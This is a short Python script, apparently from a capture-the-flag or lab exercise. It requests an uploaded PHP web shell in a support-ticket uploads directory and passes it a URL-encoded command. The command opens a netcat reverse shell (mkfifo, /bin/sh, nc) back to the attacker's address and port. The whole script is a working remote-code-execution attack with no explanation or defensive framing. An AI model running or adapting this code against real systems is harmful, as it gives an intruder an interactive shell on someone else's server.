import requests

ip = "10.10.14.8"

port = "1337"

payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+ip+"%20"+port+"%20%3E%2Ftmp%2Ff%0A"

hash = "373eec83bd8a1774bc0ec95f2c507786.php"

url = "http://10.10.10.121/support/uploads/tickets/"+hash+"?cmd=" + payload

r = requests.get(url)

print(r.text)
